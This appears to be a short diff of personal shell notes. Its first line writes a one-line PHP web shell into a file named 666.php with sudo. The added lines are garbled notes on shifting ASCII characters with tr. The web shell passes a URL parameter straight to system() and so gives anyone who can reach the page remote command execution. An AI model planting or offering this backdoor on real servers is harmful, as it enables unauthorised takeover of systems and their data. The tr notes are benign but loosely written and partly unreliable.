@@ -1,1 +1,10 @@
 sudo sh -c "echo '<?php system($_GET['cmd']); ?>' >> 666.php"
+
+characters shifts:
+  man ascii
+  echo $(tr '!-}' '"-~'<<<[)
+    $():    get value
+    tr:     set2 cp to set1
+    '!-}':  set1, asscii from ! to -
+    '"-~':  set2, asscii from " to ~
+    <<<[:   pass [ to tr '!-}' '"-~'
